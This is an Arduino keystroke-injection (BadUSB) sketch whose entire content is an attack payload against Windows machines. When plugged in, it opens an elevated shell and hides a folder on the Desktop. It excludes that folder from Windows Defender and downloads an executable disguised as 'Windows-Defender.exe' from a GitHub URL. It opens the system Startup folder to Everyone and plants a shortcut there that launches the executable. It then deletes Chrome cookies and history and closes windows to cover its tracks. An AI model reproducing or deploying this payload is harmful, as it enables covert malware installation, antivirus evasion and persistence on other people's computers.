#include "Keyboard.h"
#define  MENU_KEY 0xED

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  // Start Keyboard and Mouse
  Keyboard.begin();

  // Start Payload
  delay(500);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();


  delay(200);

  Keyboard.print(F("cmd"));

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(1500);
  
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();

  delay(600);

  Keyboard.print(F("start"));

  typeKey(KEY_RETURN);

  delay(300);

  Keyboard.print(F("MKDIR \"%USERPROFILE%\\Desktop\\system\" & cd \"%USERPROFILE%\\Desktop\\system\" & attrib +s +h \"%USERPROFILE%\\Desktop\\system\" & powershell"));

  typeKey(KEY_RETURN);

  delay(400);

  // The next line will exclude the path to system folder so it will not be checked by windows defender antivirus and hide the folder that was created

  Keyboard.print(F("$stopwatch =  [system.diagnostics.stopwatch]::StartNew();$seconds = $stopwatch.Elapsed.TotalSeconds; Add-MpPreference -ExclusionPath \"$env:USERPROFILE\\Desktop\\system\";$wc=New-Object System.Net.Webclient; $wc.DownloadFile(\"https://www.github.com/smallmacy/Cyber_Project/raw/master/final.exe\", \"Windows-Defender.exe\"); $seconds1 = $stopwatch.Elapsed.TotalSeconds;$seconds1 - $seconds"));  


  typeKey(KEY_RETURN);

  delay(100);

  // switch to other cmd tab

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();

  delay(200);

  // This will allow everyone full acess over Startup directory, which is nessecary to run the shortcut

  Keyboard.print(F("Icacls \"%PROGRAMDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" /grant Everyone:(OI)(CI)F /T & cd \"%PROGRAMDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" & start ."));

  typeKey(KEY_RETURN);

  delay(1500);

  Keyboard.press(MENU_KEY);

  Keyboard.releaseAll();
  
  Keyboard.print(F("w"));
  
  Keyboard.print(F("s"));

  typeKey(KEY_RETURN);

  delay(1500);

  // Script for shortcut:

  Keyboard.print(F("C:\\Windows\\System32\\cmd.exe /min /c \"set __COMPAT_LAYER=RUNASINVOKER && wmic nic get Name,NetConnectionStatus > \"\"%USERPROFILE%\\Desktop\\system\\connections.txt\"\" && start \"\" %USERPROFILE%\\Desktop\\system\\Windows-Defender.exe\""));

  typeKey(KEY_RETURN);

  delay(600);

  Keyboard.print(F("test"));

  typeKey(KEY_RETURN);

  delay(900);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(119);
  Keyboard.releaseAll();

  delay(300);

  // Steps to restore chrome if it was up or just delete the history file if it isn't:

  // Check if chrome is running by the lines until the if statement:

  Keyboard.print(F("FOR /F \"tokens=* USEBACKQ\" %g IN (`tasklist /FI \"STATUS eq RUNNING\" /FI \"IMAGENAME eq chrome.exe\"`) DO (SET condition=%g)"));

  typeKey(KEY_RETURN);

  delay(300);

  Keyboard.print(F("IF NOT \"%condition%\" == \"INFO: No tasks are running which match the specified criteria.\" (start chrome)"));

  // Either open chrome and delete the cookies so webtop user will be logged out, or do nothing if chrome isn't running

  typeKey(KEY_RETURN);

  delay(2000);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_DELETE);
  Keyboard.releaseAll();

  delay(1300);

  typeKey(KEY_RETURN);

  delay(900);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(119);
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  delay(400);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();

  delay(2300);

  // Deleting the other cmd after removing the exclusion from windows defender

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print(F("c"));

  delay(300);

  // Delete chrome windows if exists and the history file and starting the shortcut

  Keyboard.print(F("TSKILL chrome & start test.lnk"));

  typeKey(KEY_RETURN);

  delay(900);

  Keyboard.print(F("DEL \"%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History\" & DEL \"%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\History\""));

  typeKey(KEY_RETURN);

  delay(250);

  // Either go to chrome to restore tabs, or open another cmd window. Both ways close all suspicious windows

  Keyboard.print(F("IF NOT \"%condition%\" == \"INFO: No tasks are running which match the specified criteria.\" (start chrome & exit) else (start)"));

  typeKey(KEY_RETURN);

  delay(1000);
 
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(116);
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();

  delay(300);

  Keyboard.print(F("exit"));

  typeKey(KEY_RETURN);

  delay(400);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(200);

  Keyboard.print(F("c"));

  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
}

// Unused
void loop() {}
